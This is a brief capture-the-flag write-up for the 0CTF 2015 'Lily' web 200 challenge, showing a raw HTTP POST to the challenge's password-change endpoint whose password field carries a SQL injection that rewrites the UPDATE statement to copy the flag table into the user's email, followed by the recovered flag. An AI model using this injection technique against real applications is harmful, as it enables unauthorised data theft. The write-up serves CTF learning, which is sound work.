+++
author = "pwntester"
date = 2015-03-30T17:25:00Z
description = ""
draft = false
slug = "lily-web-200"
title = "0CTF 2015 - Lily (web 200)"

+++

A simple web where we can register and login in. Once logged in, we can change our password.
The home page shows a message from `Tales from two cities` and the email we used for log in.

There is a SQL injection affecting the `UPDATE` statement sent with the `Modify password` feature. The idea is to modify the statement to change also the email (that we can read in the home page):

```lang-raw
POST /modify HTTP/1.1
Host: 202.112.26.104:5000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:36.0) Gecko/20100101 Firefox/36.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,es-ES;q=0.8,es;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://202.112.26.104:5000/modify
Cookie: session=.eJyrVopPy0kszkgtVrKKrlZSKIFQSUpWSknhYVXJRm55UYG2tkq1OlDR8HBLQ0-PlJzk3ND0JHfLvCijsGxPd0vDFEeQqliwOjINySkFGRCro5STn56emhKfmadkVVJUmqqjVFqcWpSXmJsK1FpQnpdaZGigVAsAq0Q6FQ.B_iyaw.haWh_kdtJXPqgs1n__YSVID6vlY
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

password=0ewr1pn',email=(SELECT flag from flag),password='0ewr1pn
```

![Flag](/images/2015/Mar/Screen-Shot-2015-03-30-at-15-55-53.png)

FLAG is `0CTF{R0t_?_S8rRy_1_doNt_N}`

